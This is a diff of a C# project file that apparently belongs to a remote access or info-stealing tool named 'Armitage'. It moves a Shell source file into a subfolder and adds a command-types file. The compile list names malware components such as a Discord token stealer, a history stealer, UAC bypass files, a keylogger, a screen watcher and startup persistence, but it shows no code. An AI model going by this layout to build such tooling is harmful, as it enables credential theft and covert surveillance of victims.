@@ -124,12 +124,13 @@
     <Compile Include="Armitage\Cookies\Discord Token.cs" />
     <Compile Include="Armitage\Cookies\History Stealer.cs" />
     <Compile Include="Armitage\Critical Process.cs" />
+    <Compile Include="Armitage\Shell\Command Types.cs" />
     <Compile Include="Armitage\Startup.cs" />
     <Compile Include="Armitage\UAC\ICMLuaUtil.cs" />
     <Compile Include="Armitage\UAC\MasqueradePEB.cs" />
     <Compile Include="Armitage\UAC\UAC Bypass.cs" />
     <Compile Include="Armitage\Copy.cs" />
-    <Compile Include="Armitage\Shell.cs" />
+    <Compile Include="Armitage\Shell\Shell.cs" />
     <Compile Include="Armitage\Watchers\Filesystem.cs" />
     <Compile Include="Armitage\Watchers\Keylogger.cs" />
     <Compile Include="Armitage\Watchers\Screen Watcher.cs" />
